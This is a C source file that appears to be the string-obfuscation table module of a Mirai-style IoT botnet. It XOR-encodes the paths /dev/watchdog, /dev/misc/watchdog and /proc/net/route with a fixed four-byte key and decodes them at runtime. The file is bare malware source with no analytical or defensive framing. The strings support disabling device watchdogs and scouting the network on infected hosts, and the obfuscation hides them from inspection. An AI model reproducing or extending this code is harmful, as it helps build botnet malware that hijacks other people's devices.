#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdedeffba;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    // /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG, "\x6A\x21\x20\x33\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 14);
    // /dev/misc/watchdog
    add_entry(TABLE_MISC_WATCHDOG2, "\x6A\x21\x20\x33\x6A\x28\x2C\x36\x26\x6A\x32\x24\x31\x26\x2D\x21\x2A\x22\x45", 19);
    // /proc/net/route
    add_entry(TABLE_MISC_ROUTE, "\x6A\x35\x37\x2A\x26\x6A\x2B\x20\x31\x6A\x37\x2A\x30\x31\x20\x45", 16);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

